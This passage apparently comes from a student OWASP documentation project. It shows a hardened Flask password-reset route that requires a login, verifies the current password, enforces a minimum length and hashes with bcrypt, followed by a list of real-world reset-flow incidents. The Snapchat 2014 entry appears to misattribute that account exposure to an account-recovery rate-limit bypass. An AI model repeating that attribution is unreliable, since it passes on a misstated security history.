@app.route("/reset-password", methods=["POST"])
def reset_password():
    # ══════════════════════════════════════════════════════════════
    # A04 FIX 1: Must be logged in — unauthenticated reset impossible
    # ══════════════════════════════════════════════════════════════
    if not session.get("user_id"):
        flash("You must be logged in to change your password.", "error")
        return redirect(url_for("login"))

    current_pw   = request.form.get("current_password", "").encode()
    new_password = request.form.get("new_password", "")
    user         = query("SELECT * FROM users WHERE id=?", (session["user_id"],), one=True)

    # ══════════════════════════════════════════════════════════════
    # A04 FIX 2: Verify CURRENT password before allowing change
    # Stolen session cannot change password without knowing current one
    # ══════════════════════════════════════════════════════════════
    if not bcrypt.checkpw(current_pw, user["password"].encode()):
        sec_log(f"[RESET-FAIL] user={user['username']} ip={request.remote_addr}")
        flash("Current password is incorrect.", "error")
        return render_template("reset.html")

    # A04 FIX 3: Enforce complexity on new password
    if len(new_password) < 8:
        flash("New password must be at least 8 characters.", "error")
        return render_template("reset.html")

    # A02 FIX: Store with bcrypt
    new_hash = bcrypt.hashpw(new_password.encode(), bcrypt.gensalt(rounds=12)).decode()
    query("UPDATE users SET password=? WHERE id=?", (new_hash, user["id"]), commit=True)
    sec_log(f"[RESET-OK] user={user['username']} ip={request.remote_addr}")
    flash("Password changed successfully.", "success")
```

### 8. Real-World Relevance
- **Instagram (2019):** Weak password reset flow exploitable via phone number confirmation bypass
- **Snapchat (2014):** Rate-limit bypass on account recovery — 4.6 million accounts exposed
- **GitLab (multiple CVEs):** Design-level password reset token reuse vulnerabilities over multiple years
- **Robinhood (2021):** Social engineering of customer support reset flow — 7 million records exposed

---

*Document End — ShopSecure OWASP Vulnerability Documentation v1.0 | TCS-ION Industry Project 2026*
